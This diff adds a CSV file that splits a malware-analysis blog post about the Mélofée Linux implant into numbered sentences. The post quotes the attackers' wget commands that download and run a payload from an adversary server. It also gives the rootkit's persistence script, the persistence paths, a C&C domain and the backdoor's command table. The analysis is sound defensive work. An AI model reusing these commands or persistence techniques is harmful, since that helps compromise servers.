@@ -1,0 +1,96 @@
+Number,Content
+Sentence 1,"Mélofée: a new alien malware in the Panda's toolset targeting Linux hosts
+28.03.2023 00:00
+We recently discovered an novel undetected implant family targeting Linux servers, which we dubbed Mélofée."
+Sentence 2,"We linked with high confidence this malware to chinese state sponsored APT groups, in particular the notorious Winnti group."
+Sentence 3,"In this blogpost we will first analyze the capabilities offered by this malware family, which include a kernel mode rootkit, and then deep dive in an infrastructure pivot maze to discover related adversary toolsets."
+Sentence 4,"adversarypanda
+Mélofée implant analysis
+We found three samples of this malware family, which we dubbed Mélofée."
+Sentence 5,"Two of these samples included a version number (20220111, 20220308), and we assess that the last sample was likely dated from late April or May 2022."
+Sentence 6,"All these samples shared a common code base, but showed a constant development in the following domains:
+
+evolutions of the communication protocol and the packet format
+change in the encryption of the configuration, using first RC4 and then a simple xor
+the development of a SelfForwardServer functionality
+lastly, the inclusion of a kernel mode rootkit in the last sample."
+Sentence 7,"Rootkit
+The first sample we found dropped a rootkit based on a modified version of the open source projet Reptile 1."
+Sentence 8,"According to the vermagic metadata, it is compiled for a kernel version 5.10.112-108.499.amzn2.x86_64."
+Sentence 9,"The rootkit has a limited set of features, mainly installing a hook designed for hiding itself."
+Sentence 10,"The rootkit hooks the functions fillonedir, filldir and filldir64 in order to not display files with names containing intel_audio or rc.modules when listing a directory."
+Sentence 11,It also hooks the inet_ioctl function in order to be able to communicate with its userland part using the ioctl system call.
+Sentence 12,"The kernel rootkit expects the userland component to send a value of 0xe0e0e0e during the IOCTL call, with 2 commands supported (these two commands being hide and show)."
+Sentence 13,The rootkit is loaded both by the installer and server components with a call to the insmod utility.
+Sentence 14,"Installer
+The implant and the rootkit were installed using shell commands downloading both the installer and a custom binary package from an adversary controlled server."
+Sentence 15,This behaviour is similar to the installation process of Winnti Linux rootkits.
+Sentence 16,"wget http://173.209.62.186:8765/installer -O /var/tmp/installer
+wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd;
+chmod +x /var/tmp/installer;
+/var/tmp/installer -i /var/tmp/usbd
+The installer is also developped in C++, and takes the binary package as an argument."
+Sentence 17,It then then proceeds to extract and install both the rootkit and the server component.
+Sentence 18,"The rootkit and implant paths are hardcoded to respectively /etc/intel_audio/intel_audio.ko and /etc/intel_audio/audio The installer inserts the kernel rootkit using a call to system(insmod /etc/intel_audio/intel_audio.ko), and also install the persistance in the /etc/rc.modules file."
+Sentence 19,Writing to this script ensures that both kernel and implant are executed at boot time2.
+Sentence 20,"The resulting script after installation can be seen below:
+
+#!/bin/sh
+#Script for starting modules
+/sbin/insmod /etc/intel_audio/intel_audio.ko
+/etc/intel_audio/audio
+#End script
+The first bytes of the package includes the offset to the payload (in little endian), which is used to correctly extract the kernel rootkit and the server implant."
+Sentence 21,"00000000: b07e 0000 a841 3000 7f45 4c46 0201 0100  .~...A0..ELF....
+00000010: 0000 0000 0000 0000 0100 3e00 0100 0000  ..........>.....
+00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................"
+Sentence 22,"The developper was also kind enough to includes an usage function describing the installer’s options:
+
+void usage(undefined8 param_1)
+
+{
+  printf(Usage: <%s> [options]\n,param_1);
+  puts(    -r                  Remove);
+  puts(    -i <data file>      Install);
+  puts(    -d                  Run in background);
+  puts(    -h                  Show help);
+  return;
+}
+Configuration management
+The configuration is encrypted using the RC4 algorithm in the two early samples, and with a simple xor with a single byte key (0x43) in the undated sample."
+Sentence 23,"The configuration format has changed between the samples, the first one containing all elements in encrypted form, and the last one with only the C&C domain encrypted."
+Sentence 24,"Example of decrypted configuration:
+
+1:www.data-yuzefuji.com:443:5
+
+This configuration contains the following elements:
+
+The socket type (0x1 being TCP)
+The C&C domain
+The communication port
+The sleeptime in minutes between requests
+Persistance mechanisms
+The implant has two mechanisms of persistance, depending on its running privileges."
+Sentence 25,"If it runs as the root user, it tries to write a line containing sh -c IMPLANT_EXECUTABLE_NAME >/dev/null 2>& in the files /etc/rc.local or /etc/rc.d/rc.local."
+Sentence 26,"If it runs as a simple user, it will try to install its persistance in the following files:
+
+/home/CURRENT_USERNAME/.bash_profile
+/home/CURRENT_USERNAME/.bash_login
+/home/CURRENT_USERNAME/.profile
+The rootkit installer will insert the persistance for the kernel module in the /etc/rc.modules file."
+Sentence 27,"Supported commands
+The commands supported by the implant have evolved between the samples, showing current development of the backdoor."
+Sentence 28,"The first two versions:
+
+Command ID	Capability	Comment
+0x103	ping_back	Sent by the client
+0x1	uninstall	Kill the current process and removes the persistance
+0x2	update_and_relaunch	Overwrite the current running file and relaunch
+0x3	launch_new_command_thread	Creates a new socket for interaction
+0x4	write_file	
+0x5	read_file	
+0x6	launch_shell	
+0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP
+0x10	send_local_information	Hostname, date, current UID, implant version number, …
+0x50001	list_directory	
+0x50002	create_directory"
